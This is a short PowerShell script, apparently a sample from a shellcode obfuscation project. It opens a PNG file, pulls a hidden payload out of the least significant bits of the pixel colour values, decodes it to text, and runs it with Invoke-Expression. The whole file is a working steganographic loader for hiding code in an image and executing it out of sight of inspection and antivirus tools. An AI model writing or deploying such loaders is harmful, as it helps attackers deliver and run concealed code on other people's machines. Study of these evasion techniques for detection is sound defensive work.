[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")


[string] $filename = "C:\Users\Blackberry\Desktop\projects\yet-another-shellcode-obfuscator\samples\cmd\powershell.png"
[Int32] $length = 45896



function get_lsb([byte]$target, [byte]$source) { 
    $a = $target -shl 1
    $b = $source -band 1
    $a -bor $b
}

function get_payload($length) {
    [Int32]$pos = 0
    $BitMap = [System.Drawing.Image]::FromFile((Get-Item $filename).fullname, $true)
    $bytes = New-Object byte[] ($length / 8)

    foreach($y in (0..($BitMap.Height-1))) {
        foreach($x in (0..($BitMap.Width-1))) {
            $Pixel = $BitMap.GetPixel($x,$y)
            $R = $Pixel | Select-Object -ExpandProperty R
            $G = $Pixel | Select-Object -ExpandProperty G
            $B = $Pixel | Select-Object -ExpandProperty B
           

            foreach ($byte in ($R, $G, $B)) {  
                if ($length -le 0) {
                    return $bytes
                }

                $idx = [int][Math]::Floor($pos / 8)
                $bytes[$idx] = get_lsb $bytes[$idx] $byte
                
                $pos += 1
                $length -= 1
            }
        }
    }
}


$payload_data = get_payload $length

$payload_string = [System.Text.Encoding]::ASCII.GetString($payload_data)
Invoke-Expression "$payload_string"

Start-Sleep -s 3
